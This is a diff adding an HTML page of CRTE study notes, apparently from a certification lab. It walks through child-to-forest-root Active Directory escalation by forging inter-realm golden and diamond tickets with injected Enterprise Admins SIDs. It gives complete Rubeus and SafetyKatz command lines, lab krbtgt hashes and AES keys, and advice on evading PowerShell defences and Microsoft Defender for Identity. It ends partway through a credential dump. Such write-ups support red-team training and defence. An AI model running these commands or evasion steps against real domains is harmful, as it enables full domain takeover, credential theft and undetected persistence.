@@ -1,0 +1,236 @@
+---
+title: Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse
+layout: docs
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse - CRTE</title>
+  <link rel="shortcut icon" href="../../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+          <a href="overview.html" class="">Overview</a>
+
+          <a href="part-01-introduction.html" class="">Introduction</a>
+          <a href="part-02-enumeration.html" class="">Enumeration</a>
+          <a href="part-03-enumerating-gpos-ous.html" class="">Enumerating GPOs and OUs</a>
+          <a href="part-04-enumerating-acl.html" class="">Enumerating ACL (Access Control List)</a>
+          <a href="part-05-enumerating-domain-forest-trusts.html" class="">Enumerating Domain, Forest & Trusts </a>
+          <a href="part-06-privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="part-07-kerberoasting-attack.html" class="">Kerberoasting attack</a>
+          <a href="part-08-targeted-kerberoasting.html" class="">Privilege Escalation - Targeted Kerberoasting</a>
+          <a href="part-09-laps-attack.html" class="">Privilege Escalation - LAPS (Local Administrator Password Solution) Attack</a>
+          <a href="part-10-dumping-lsass-credentials.html" class="">Dumping LSASS Credentials</a>
+          <a href="part-11-gmsa-attack.html" class="">Privilege Escalation - gMSA Attack</a>
+          <a href="part-12-lsass-mde-bypass.html" class="">LSASS Attack With MDE Bypass</a>
+          <a href="part-13-pass-the-certificates.html" class="">Pass The Certificates Attack</a>
+          <a href="part-14-unconstrained-delegation.html" class="">Privilege Escalation - Unconstrained Delegation</a>
+          <a href="part-15-constrained-delegation.html" class="">Privilege Escalation - Constrained Delegation</a>
+          <a href="part-16-rbcd.html" class="">Privilege Escalation - RBCD(Resource Based Constrained Delegation)</a>
+          <a href="part-17-golden-ticket.html" class="">Domain Persistence - Golden Ticket attack</a>
+          <a href="part-18-silver-ticket.html" class="">Domain Persistence - Silver Ticket Attack</a>
+          <a href="part-19-diamond-ticket.html" class="">Domain Persistence - Diamond Ticket Attack</a>
+          <a href="part-20-skeleton-key.html" class="">Domain Persistence - Skeleton Key Attack</a>
+          <a href="part-21-sapphire-ticket.html" class="">Domain Persistence - Sapphire Ticket Attack</a>
+          <a href="part-22-adminsdholder.html" class="">Domain Persistence - AdminSDHolder attack</a>
+          <a href="part-23-adcs-attacks.html" class="">Cross Domain Attacks - Active Directory Certificate Services Attacks</a>
+          <a href="part-24-shadow-credentials.html" class="">Shadow Credentials - Abusing User Object</a>
+          <a href="part-25-cross-domain-unconstrained.html" class="">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</a>
+          <a href="part-26-azure-ad-phs.html" class="">Cross Domain Attacks - Attacking Azure AD Integration PHS</a>
+          <a href="part-27-child-to-forest-trust-key.html" class="">Cross Domain attacks - Child To Forest Root - SID-History Trust Key Abuse</a>
+          <a href="part-28-child-to-forest-sidhistory-krbtgt.html" class="active">Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse</a>
+          <a href="part-29-cross-forest-kerberoast.html" class="">Cross Forest Attacks - Kerberoast Attack</a>
+          <a href="part-30-protocol-transition.html" class="">Cross Forest Attacks - Constrained Delegation with Protocol Transition</a>
+          <a href="part-31-cross-forest-unconstrained.html" class="">Cross Forest Attacks - Unconstrained Delegation</a>
+          <a href="part-32-trust-key-shared-resources.html" class="">Cross Forest Attacks - Trust Key Abuse to Access Explicitly Shared Resources</a>
+          <a href="part-33-injecting-sidhistory.html" class="">Cross Forest Attacks - Injecting SID History to Bypass SID Filtering</a>
+          <a href="part-34-mssql-database-links.html" class="">Trust Abuse - MSSQL Servers - Database Links</a>
+          <a href="part-35-foreign-security-principals.html" class="">Cross Forest Attacks - Foreign Security Principals & ACLs</a>
+          <a href="part-36-pam-shadow-security-principals.html" class="">Cross Forest Attacks - Abusing PAM(Privileged Management Principals) Trust - Shadow Security Principals</a>
+          <a href="part-37-trusting-to-trusted.html" class="">Cross Forest Attacks - Trusting to Trusted - Trust Key</a>
+          <a href="part-38-abusing-trust-transitivity.html" class="">Cross Forest Attacks - Abusing Trust Transitivity</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse</header>
+        <section class="about-text notion-content">
+<p id="30c79e9a-d7c9-80b7-b8b3-df3af3855010" class="">Cross-domain attacks, specifically moving from a child domain to the forest root by abusing the <strong>krbtgt</strong> account, rely on the fundamental weaknesses in how Active Directory handles <strong>SID history</strong> and <strong>inter-realm Kerberos trust</strong>. When we compromise a child domain, we do not immediately have control over the forest, but through <strong>golden ticket</strong> attacks with manipulated <strong>SID history</strong>, we can escalate privileges and obtain the <strong>krbtgt hash</strong> of the forest root, effectively gaining complete control.</p><p id="30c79e9a-d7c9-80d3-9b65-c6d6771a1812" class="">The forest is the <strong>true security boundary</strong> in Active Directory, meaning that domain-level security measures cannot prevent escalation if we control a child domain. Each domain within the forest has its own <strong>krbtgt</strong> account, which encrypts and signs <strong>TGTs (Ticket Granting Tickets)</strong> issued by that domain’s <strong>KDC (Key Distribution Center)</strong>. However, when a user needs to authenticate across domains within the same forest, <strong>inter-realm trust</strong> is used, and this mechanism can be abused.</p><p id="30c79e9a-d7c9-8046-8bb2-d8e35c8a08ac" class="">To escalate from a child domain to the forest root, we first need to compromise a <strong>domain administrator</strong> or a domain controller in the child domain. This allows us to extract the <strong>krbtgt</strong> hash of the child domain, enabling us to forge <strong>golden tickets</strong>. Normally, golden tickets allow unrestricted access within the compromised domain, but when we introduce <strong>SID history manipulation</strong>, we can expand our influence beyond the child domain.</p><p id="30c79e9a-d7c9-8007-9949-cf302500b98e" class="">SID history is an attribute designed to allow smooth user migration across domains by maintaining the original <strong>Security Identifier (SID)</strong>. However, since Kerberos does not inherently verify SID history, attackers can inject <strong>the Enterprise Admins SID (519)</strong> into a forged TGT. When this manipulated TGT is validated by the domain controller in the child domain, it will include the injected <strong>Enterprise Admins SID</strong> when issuing an <strong>inter-realm TGT</strong> for the forest root. Because this inter-realm TGT is trusted, the forest root domain controller treats the request as coming from an <strong>Enterprise Admin</strong>, granting us <strong>full forest-wide privileges</strong>.</p><p id="30c79e9a-d7c9-8051-8f21-e0e727fb2181" class="">Detection mechanisms rely on monitoring <strong>abnormal authentication paths</strong>. A domain admin from a child domain should not normally be logging into the forest root domain controller, making it a red flag. However, we can evade detection by using a <strong>domain controller machine account</strong> instead of a domain administrator account. By injecting the <strong>SID of domain controllers (516)</strong> and <strong>Enterprise Admins (519)</strong> into our golden ticket, we can use <strong>DCSync</strong> to dump <strong>krbtgt</strong> from the forest root without triggering alerts typically associated with user logins.</p><p id="30c79e9a-d7c9-804f-b251-fb9fe309a666" class="">An alternative approach to remain stealthy is the <strong>diamond ticket</strong>, which improves upon the golden ticket by including <strong>pre-authentication steps</strong>. This method mimics legitimate Kerberos authentication flows, making it harder to detect. When combined with <strong>SID history injection</strong>, a diamond ticket grants seamless and persistent access to the entire forest.</p><p id="30c79e9a-d7c9-8053-9423-e4b204d837fb" class="">Once we obtain the <strong>krbtgt hash of the forest root</strong>, we can generate valid TGTs for any user within the entire Active Directory environment, ensuring <strong>long-term persistence</strong>. From this point, we own the entire forest, and no administrator action within the domain can fully evict us unless the <strong>krbtgt password is reset twice</strong> on all domain controllers.</p><p id="30c79e9a-d7c9-800e-af4b-cf2fce0fd9f2" class="">Mastering this attack means understanding the following key aspects: how <strong>krbtgt signs and validates TGTs</strong>, the function of <strong>SID history</strong> in cross-domain authentication, the mechanics of <strong>inter-realm Kerberos trust</strong>, and how to effectively evade <strong>logging and monitoring mechanisms</strong>. If we successfully execute this attack while remaining undetected, we achieve <strong>complete Active Directory dominance</strong>, allowing us to control and manipulate the entire forest at will.</p><h1 id="30c79e9a-d7c9-80ec-b2c9-eeacea80dcac" class="">Enumerating Trusts with PowerView</h1><p id="30c79e9a-d7c9-8018-a045-fab3379f37bf" class="">For this attack, we should start our enumeration to better understand how is our target organization configured based on trusts. Assuming that we have compromised our target child domain, our next stop should be to escalate our privilege all the wait up to the forest root (Child to Parent Domain). We can do our enumeration using PowerView.</p><p id="30c79e9a-d7c9-805a-9b50-cc1c732aff82" class="">Let’s start by calling our PowerShell session using InvisiShell, this will help us to bypass all PowerShell Defense Mechanism before we call the new PowerShell process. <br/><code>RunWithRegistryNonAdmin.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20260.png" alt="Image"/><p id="30c79e9a-d7c9-8080-8aaa-ed43bbca5ff9" class="">then we import PowerView and make our enumeration.<br/><code>Import-Module .\PowerView.ps1</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20279.png" alt="Image"/><p id="30c79e9a-d7c9-8005-8952-d37435d56570" class="">As we can see above our just compromised Child Domain (<code><strong>us.techcorp.local</strong></code>), has a BiDirectional Trust with the root domain (<code><strong>techcorp.local</strong></code>).</p><h3 id="30c79e9a-d7c9-8088-ad6f-ea1114e3bd6c" class="">Source and Target Names</h3><ol><li><strong>SourceName</strong>: The name of the source domain, which is <code><strong>us.techcorp.local</strong></code>.</li></ol><ol><li><strong>TargetName</strong>: The name of the target domain, which is <code><strong>techcorp.local</strong></code>.</li></ol><h3 id="30c79e9a-d7c9-80bd-b2ec-c892d6e76c34" class="">Trust Type and Attributes</h3><ol><li><strong>TrustType</strong>: The type of trust, which is <code>WINDOWS_ACTIVE_DIRECTORY</code>, indicating that it is a Windows Active Directory trust.</li></ol><ol><li><strong>TrustAttributes</strong>: The attributes of the trust, which are <code>WITHIN_FOREST</code>, indicating that the trust is within the same forest.</li></ol><h3 id="30c79e9a-d7c9-8073-8aef-dcfe29dc244d" class="">Trust Direction</h3><ol><li><strong>TrustDirection</strong>: The direction of the trust, which is <code>Bidirectional</code>, indicating that the trust is bidirectional, allowing both domains to access resources in each other.</li></ol><p id="30c79e9a-d7c9-80c2-bb23-dec6312513f3" class="">Now that we have done the enumeration and we know exactly how is the Child/Parent domain trust configured, let’s carry on.</p><p id="30c79e9a-d7c9-8007-9215-ee67f8fa3872" class=""><code><strong>Child Domain SID:</strong></code> S-1-5-21-210670787-2521448726-163245708</p><p id="30c79e9a-d7c9-8088-abf3-e82b4849d076" class=""><code><strong>Parent Domain SID:</strong></code> S-1-5-21-2781415573-3701854478-2406986946</p><p id="30c79e9a-d7c9-80df-9faf-c99ec71fbfe3" class="">We have below our Child Domain KRBTGT hashes</p><pre id="30c79e9a-d7c9-8020-96bd-d3cff3fb06b9" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/4/2019 11:49:17 PM
+Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: b0975ae49f441adc6b024ad238935af5
+    ntlm- 0: b0975ae49f441adc6b024ad238935af5
+    lm  - 0: d765cfb668ed3b1f510b8c3861447173
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 819a7c8674e0302cbeec32f3f7b226c9
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : US.TECHCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
+      aes128_hmac       (4096) : 1bae2a6639bb33bf720e2d50807bf2c1
+      des_cbc_md5       (4096) : 923158b519f7a454</code></pre><h2 id="30c79e9a-d7c9-80c6-88c3-d55d96374567" class="">Forging Inter-Realm Golden Ticket</h2><p id="30c79e9a-d7c9-8085-ba2d-f7623a9bd97e" class="">Let’s now create the inter-realm TGT and inject into our session.  Remembering that we need to encode our Rubeus argument(<code><strong>golden</strong></code>) using ArgSplit.bat and do the copy/paste into our session where we will be running Rubeus.</p><p id="30c79e9a-d7c9-8026-a808-fa95f5aa9989" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20280.png" alt="Image"/><p id="30c79e9a-d7c9-806f-ac58-c74ce8ed7d87" class="">Now that we have encoded and copy/paste it into our session, Let’s run our Rubeus in the memory using our DotNet loader.</p><p id="30c79e9a-d7c9-808b-be1e-e7420df1b2c5" class=""><br/>We use <strong>Rubeus</strong> to create a <strong>Golden Ticket</strong> for the <code>administrator</code> account in the child domain (<code>us.techcorp.local</code>). However, by <strong>injecting the Enterprise Admins SID from the forest root</strong>, we make the forged TGT look like it belongs to an <strong>Enterprise Admin</strong> in the entire forest. When this ticket is used, the <strong>forest root domain controller</strong> trusts it and grants <strong>privileged access to the entire AD forest</strong>.</p><p id="30c79e9a-d7c9-8035-bec2-f098e1209ce4" class="">This is the <strong>core technique</strong> that enables <strong>child-to-forest root escalation</strong> using <strong>SID history abuse</strong>.</p><p id="30c79e9a-d7c9-800c-867e-d1a43c9bfde4" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /id:500 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /ptt</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20281.png" alt="Image"/><ol><li><code><strong>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn%</strong></code><ul><li>This part is <strong>not related to Rubeus itself</strong> but rather a way to <strong>execute Rubeus</strong> using a loader (possibly to evade detection or bypass restrictions).</li></ul><ul><li><code>%Pwn%</code> is likely a placeholder for arguments being passed dynamically.</li></ul></li></ol><ol><li><code><strong>/user:administrator</strong></code><ul><li>Specifies the <strong>username</strong> to impersonate in the forged ticket.</li></ul><ul><li>Here, we are forging a <strong>TGT for &quot;Administrator&quot;</strong>.</li></ul></li></ol><ol><li><code><strong>/id:500</strong></code><ul><li>Defines the <strong>RID (Relative Identifier)</strong> for the account.</li></ul><ul><li><code>500</code> is always the <strong>RID of the built-in Administrator</strong> account.</li></ul></li></ol><ol><li><code><strong>/domain:us.techcorp.local</strong></code><ul><li>Sets the <strong>domain</strong> for which we are forging the <strong>Golden Ticket</strong>.</li></ul><ul><li>This is the <strong>child domain</strong> where the <strong>krbtgt hash</strong> was extracted.</li></ul></li></ol><ol><li><code><strong>/sid:S-1-5-21-210670787-2521448726-163245708</strong></code><ul><li>Specifies the <strong>primary domain SID</strong>.</li></ul><ul><li>This is <strong>critical for TGT validation</strong> because the domain controller verifies that the SID matches the domain.</li></ul></li></ol><ol><li><code><strong>/groups:513</strong></code><ul><li>Defines the <strong>group memberships</strong> assigned to the forged ticket.</li></ul><ul><li><code>513</code> is the <strong>Domain Users</strong> group, ensuring normal user-like behavior.</li></ul></li></ol><ol><li><code><strong>/sids:S-1-5-21-2781415573-3701854478-2406986946-519</strong></code><ul><li><strong>Injects a SID history</strong> into the forged ticket.</li></ul><ul><li>The <strong>SID belongs to the Enterprise Admins group (519)</strong> from the <strong>forest root domain</strong>.</li></ul><ul><li>This tricks the <strong>forest root domain controller</strong> into treating us as an <strong>Enterprise Admin</strong>, allowing <strong>privilege escalation</strong> from the child domain to the forest root.</li></ul></li></ol><ol><li><code><strong>/aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5</strong></code><ul><li>Provides the <strong>AES-256 key</strong> (KRBTGT hash) of the <strong>child domain</strong>.</li></ul><ul><li>This is used to <strong>sign and encrypt the forged TGT</strong>, making it <strong>valid</strong> for authentication.</li></ul></li></ol><ol><li><code><strong>/ptt</strong></code><ul><li><strong>Pass-the-Ticket (PTT) mode</strong>.</li></ul><ul><li>Loads the <strong>forged TGT directly into memory</strong>, allowing <strong>immediate authentication</strong> without writing it to disk.</li></ul></li></ol><p id="30c79e9a-d7c9-80fe-8002-c5a350dca258" class="">As we can see above we were able to Request the Inter-realm Golden Ticket using KRBTGT hash and inject it into our current session. <br/>We can also double check this with <code><strong>klist</strong></code> command.</p><p id="30c79e9a-d7c9-8062-9a0c-c16b660e2331" class=""><code>klist</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20282.png" alt="Image"/><p id="30c79e9a-d7c9-805e-9407-d9aa92a0d071" class="">Let’s now try to access the Domain Controller in the parent domain techcorp.local (<code><strong>techcorp-dc</strong></code>). bare in mind that, since we forget an Inter-realm Golden ticket, we can simply access any service in the parent domain.</p><p id="30c79e9a-d7c9-80d5-bbba-c1330ea912d4" class=""><code>dir \\TECHCORP-DC.techcorp.local\C$</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20283.png" alt="Image"/><p id="30c79e9a-d7c9-80d1-9567-f92be8d77594" class=""><code>winrs -r:techcorp-dc.techcorp.local cmd</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20284.png" alt="Image"/><h2 id="30c79e9a-d7c9-8091-85bd-e516647c4d0f" class="">Forging Inter-Realm Diamond Ticket</h2><p id="30c79e9a-d7c9-80b0-b45d-c8b66c26e577" class="">When forging an <strong>inter-realm ticket</strong> to move from a <strong>child domain</strong> to the <strong>forest root</strong>, a <strong>golden ticket</strong> is effective but comes with <strong>detection risks</strong>. A <strong>diamond ticket</strong>, on the other hand, significantly improves stealth by including <strong>pre-authentication steps</strong>, making it blend more naturally into the Kerberos authentication flow. This is crucial when we want to bypass security monitoring solutions like <strong>Microsoft Defender for Identity (MDI)</strong> while avoiding suspicious logs on both the <strong>child domain controller (us-dc)</strong> and the <strong>forest root domain controller (techcorp-us)</strong>.</p><h3 id="30c79e9a-d7c9-807c-85ef-da7a12e063f2" class=""><strong>Golden Ticket vs. Diamond Ticket for Cross-Domain Attacks</strong></h3><p id="30c79e9a-d7c9-8089-b83a-feaaf5c64597" class="">A <strong>golden ticket</strong> is forged using the <strong>krbtgt hash</strong> of a compromised domain and allows us to generate valid <strong>TGTs (Ticket Granting Tickets)</strong> without needing to authenticate through the normal Kerberos flow. However, when we inject <strong>SID history</strong> to escalate from a <strong>child domain</strong> to the <strong>forest root</strong>, the authentication sequence <strong>lacks the normal Kerberos pre-authentication process</strong>, which raises <strong>red flags</strong> in Active Directory logs and security monitoring tools.</p><p id="30c79e9a-d7c9-805f-81d9-cc7bc0ec0734" class="">A <strong>diamond ticket</strong>, in contrast, is <strong>not completely forged</strong> but instead is <strong>constructed from a legitimate authentication exchange</strong>. It allows us to <strong>insert malicious modifications</strong> into a valid Kerberos flow, preserving the <strong>pre-authentication and TGT validation steps</strong>. This makes detection significantly harder because the request appears more legitimate.</p><h3 id="30c79e9a-d7c9-80c0-b1eb-c19e4395e8fe" class=""><strong>Stealth Considerations: Suspicious Logs in us-dc and techcorp-us</strong></h3><p id="30c79e9a-d7c9-80ed-ab52-f760ed7ff72f" class="">When using a <strong>golden ticket</strong>, several indicators can alert <strong>blue teams</strong> or <strong>MDI</strong>:</p><ol><li><strong>Logon Activity on the Child Domain Controller (us-dc):</strong><ul><li>Authentication attempts with a <strong>non-existent TGT request</strong> (because we inject a forged ticket).</li></ul><ul><li>Unexpected <strong>TGT request failures</strong> before using the golden ticket.</li></ul><ul><li><strong>Event ID 4769 (Kerberos Service Ticket Request)</strong> with <strong>unusual SIDs</strong>.</li></ul><ul><li><strong>Event ID 4768 (TGT Request)</strong> showing an administrator account logging in with a ticket that was never actually issued by the KDC.</li></ul></li></ol><ol><li><strong>Logon Activity on the Forest Root Domain Controller (techcorp-us):</strong><ul><li>Authentication requests from the child domain admin <strong>without a valid inter-realm TGT exchange</strong>.</li></ul><ul><li><strong>SID history injection</strong> appearing directly in logs, revealing privilege escalation.</li></ul><ul><li><strong>Anomalous inter-realm trust TGT requests</strong>, where the request does not match expected <strong>TGS-REQ</strong> behavior.</li></ul></li></ol><p id="30c79e9a-d7c9-80f2-aa5e-fda3ad88d7bc" class="">By using a <strong>diamond ticket</strong>, we introduce <strong>pre-authentication</strong>, making the request flow appear more legitimate. Instead of triggering <strong>suspicious TGT requests</strong>, the authentication process follows <strong>normal Kerberos flow</strong>, reducing detection risks.</p><h3 id="30c79e9a-d7c9-8080-8a5c-da9274ba366a" class=""><strong>Why We Use a Child Domain Controller Machine Account Instead of a Child Domain Administrator Account</strong></h3><p id="30c79e9a-d7c9-8076-8cc5-ecb96b6aa130" class="">Using a <strong>child domain admin account</strong> for the attack introduces further anomalies:</p><ul><li><strong>Domain Admins from a child domain should not request inter-realm TGTs</strong> frequently.</li></ul><ul><li><strong>MDI tracks logins from privileged accounts</strong>, and an admin suddenly authenticating to the <strong>forest root</strong> is highly unusual.</li></ul><ul><li>If <strong>LAPS, HoneyTokens, or deceptive Kerberos monitoring</strong> is in place, it might trigger instant <strong>blue team alerts</strong>.</li></ul><p id="30c79e9a-d7c9-8083-a5f2-fe5a5c97c3a3" class="">Instead, by leveraging a <strong>child domain controller machine account</strong>, we blend into legitimate <strong>inter-realm authentication</strong> patterns:</p><ul><li><strong>Domain Controllers naturally request inter-realm TGTs</strong> during authentication replication and trust validation.</li></ul><ul><li><strong>A machine account logging in to the forest root is normal</strong>, whereas a child domain admin attempting it is suspicious.</li></ul><ul><li><strong>MDI is less likely to flag domain controller logons</strong>, making this approach stealthier.</li></ul><h3 id="30c79e9a-d7c9-801b-98ab-f1495a5f76b9" class=""><strong>Forging an Inter-Realm Diamond Ticket</strong></h3><p id="30c79e9a-d7c9-8024-93da-c63a902ffb3d" class="">To construct a <strong>diamond ticket</strong>, we follow these steps:</p><ol><li><strong>Obtain a legitimate Kerberos authentication request</strong> using a <strong>valid machine account</strong> from the child domain (<code>us-dc$</code>).</li></ol><ol><li><strong>Intercept the request before it reaches the KDC</strong> and extract the necessary information.</li></ol><ol><li><strong>Modify the response</strong>, injecting <strong>SID history</strong> (Enterprise Admins SID <code>519</code>).</li></ol><ol><li><strong>Replay the modified request</strong>, making it appear as if it naturally followed the authentication process.</li></ol><ol><li><strong>Receive a valid inter-realm TGT</strong>, now containing <strong>elevated privileges</strong>.</li></ol><p id="30c79e9a-d7c9-802f-be5f-ee7ade7de589" class="">This approach not only bypasses <strong>MDI protections</strong> but also keeps our activities within the <strong>expected Kerberos authentication sequence</strong>, making it almost indistinguishable from legitimate domain activity.</p><p id="30c79e9a-d7c9-808d-b016-d757b4adfc27" class="">By switching from a <strong>golden ticket</strong> to a <strong>diamond ticket</strong>, and by using a <strong>domain controller machine account</strong> instead of an administrator account, we reduce detection risks and improve persistence, ensuring <strong>seamless access to the entire forest</strong> without raising alarms.</p><p id="30c79e9a-d7c9-80db-8b7a-e687ebcd1f4c" class="">I’ll skip all the enumeration steps because we already have done this previously, we will be demonstrating how we can for the inter-realm Diamond ticket and also bypassing defense mechanisms implemented in our target environment like MDE/MDI as well.</p><p id="30c79e9a-d7c9-803d-8e43-ce034ee2c7ec" class="">Back to our attacking machine, we should be able to forge this ticket. We should encode the Rubeus argument(<code><strong>diamond</strong></code>) with ArgSplit.bat and do the copy/paste into our session were Rubeus will be executed.</p><p id="30c79e9a-d7c9-80bd-8536-f651589ca5a7" class=""><code><strong>User: </strong></code>krbtgt</p><p id="30c79e9a-d7c9-8021-b272-eaa6e1fa8a75" class=""><code><strong>aes256:</strong></code> 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5</p><p id="30c79e9a-d7c9-804f-a909-c86bada97b74" class=""><code><strong>Child Domain SID:</strong></code> S-1-5-21-210670787-2521448726-163245708</p><p id="30c79e9a-d7c9-80a3-967b-d5ce2ce750bc" class=""><code><strong>Parent Domain SID:</strong></code> S-1-5-21-2781415573-3701854478-2406986946</p><p id="30c79e9a-d7c9-80d1-8b26-cc5455abedc4" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20285.png" alt="Image"/><p id="30c79e9a-d7c9-8077-adc0-f0ff50cbc719" class="">Le’ts now execute our Rubeus in the memory using our desired DotNet loader.</p><p id="30c79e9a-d7c9-8025-91c9-f94c42d2ab43" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /enctype:aes /krbkey:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /tgtdeleg /ticketuser:us-dc$ /domain:us.techcorp.local /dc:us-dc.us.techcorp.local /ticketuserid:1000 /sids:S-1-5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20286.png" alt="Image"/><p id="30c79e9a-d7c9-800d-8bc7-e620750edc51" class="">It is possible to see above that we were able to forge our inter-realm Diamond ticket and injected into a new CMD process. We can see as well by issuing the command klist, that our ticket does not present a valid</p><p id="30c79e9a-d7c9-80bb-8680-dc23ddd26477" class=""><code>C:\AD\Tools\Loader.exe -Path C:\Ad\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:techcorp\krbtgt /domain:techcorp.local&quot; &quot;exit”</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20287.png" alt="Image"/><pre id="30c79e9a-d7c9-8090-9117-e606dd8211a3" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/4/2019 1:52:52 AM
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 7735b8be1edda5deea6bfbacb7f2c3e7
+    ntlm- 0: 7735b8be1edda5deea6bfbacb7f2c3e7
+    lm  - 0: 295fa3fef874b54f29fd097c204220f0
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 9fe386f0ebd8045b1826f80e3af94aed
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TECHCORP.LOCALkrbtgt
